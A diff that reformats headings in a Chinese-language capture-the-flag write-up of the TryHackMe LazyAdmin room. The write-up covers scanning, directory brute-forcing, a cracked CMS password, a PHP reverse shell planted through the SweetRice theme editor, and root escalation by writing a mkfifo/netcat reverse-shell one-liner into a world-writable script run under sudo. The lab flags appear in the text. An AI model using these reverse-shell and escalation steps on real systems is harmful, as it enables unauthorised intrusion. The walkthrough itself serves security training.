@@ -1,7 +1,7 @@
-#服务发现
+# 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme/LazyAdminFinal]
-└─# nmap -sV -Pn 10.10.113.182 
+└─#  nmap -sV -Pn 10.10.113.182 
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 22:02 EDT
 Nmap scan report for 10.10.113.182
@@ -16,10 +16,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 14.23 seconds
 ```
 
-#目录爆破
+# 目录爆破
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -u http://10.10.113.182 -e* -t 100                                                                                                                                                                           130 ⨯
+└─#  python3 dirsearch.py -u http://10.10.113.182 -e* -t 100                                                                                                                                                                           130 ⨯
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -39,7 +39,7 @@ Target: http://10.10.113.182
 只有一个content目录，打开是一个```SweetRice```cms介绍页，继续爆破content目录
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -u http://10.10.113.182/content -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-lowercase-2.3-medium.txt
+└─#  python3 dirsearch.py -u http://10.10.113.182/content -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-lowercase-2.3-medium.txt
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -75,7 +75,7 @@ md5密码破解出来是：```Password123```
 在```/content/license.txt```和```/inc/lastest.txt```验证cms的版本号是1.5.1，在kali搜索这个版本号的cms漏洞
 ```
 ┌──(root💀kali)-[~]
-└─# searchsploit SweetRice 1.5.1
+└─#  searchsploit SweetRice 1.5.1
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                                                                            |  Path
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -95,10 +95,10 @@ Shellcodes: No Results
 登录后台，在Theme,选择Footer section template，直接编辑php源码写反弹shell，访问```http://10.10.113.182/content/_themes/default/foot.php```成功反弹到shell，拿到user.txt
 ```
 ┌──(root💀kali)-[~/tryhackme/LazyAdminFinal]
-└─# nc -lnvp 1234                                      
+└─#  nc -lnvp 1234                                      
 listening on [any] 1234 ...
 connect to [10.13.21.169] from (UNKNOWN) [10.10.113.182] 46142
-Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
+Linux THM-Chal 4.15.0-70-generic # 79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
  06:50:08 up  1:48,  0 users,  load average: 0.00, 0.00, 0.00
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -129,7 +129,7 @@ THM{63e5bce9271952aad1113b6f1ac28a07}
 两个文件所有者是root，如果可以以root的身份执行一个```/etc/copy.sh```批处理文件，我们就可以使用该sh文件来提升到root
 ```
 $ cat backup.pl
-#!/usr/bin/perl
+# !/usr/bin/perl
 
 system("sh", "/etc/copy.sh");
 $ cat /etc/copy.sh
@@ -138,10 +138,10 @@ $ ls -alh /etc/copy.sh
 -rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
 ```
 
-#写shell
+# 写shell
 ```echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.21.169 4242 >/tmp/f" > /etc/copy.sh```
 
-#切换tty,查看sudo -l，www-data正好可以用root权限执行/home/itguy/backup.pl
+# 切换tty,查看sudo -l，www-data正好可以用root权限执行/home/itguy/backup.pl
 ```
 $ python -c 'import pty; pty.spawn("/bin/sh")'
 $ sudo -l
@@ -157,15 +157,15 @@ sudo /usr/bin/perl /home/itguy/backup.pl
 
 ```
 
-#与此同时另起一个端口监听，拿到root反弹shell和root.txt
+# 与此同时另起一个端口监听，拿到root反弹shell和root.txt
 ```
 ┌──(root💀kali)-[~]
-└─# nc -lnvp 4242                                                                                                                                                                                                                       1 ⨯
+└─#  nc -lnvp 4242                                                                                                                                                                                                                       1 ⨯
 listening on [any] 4242 ...
 connect to [10.13.21.169] from (UNKNOWN) [10.10.113.182] 33518
-# id
+#  id
 uid=0(root) gid=0(root) groups=0(root)
-# cat /root/root.txt
+#  cat /root/root.txt
 THM{6637f41d0177b6f37cb20d775124699f}
 
 ```
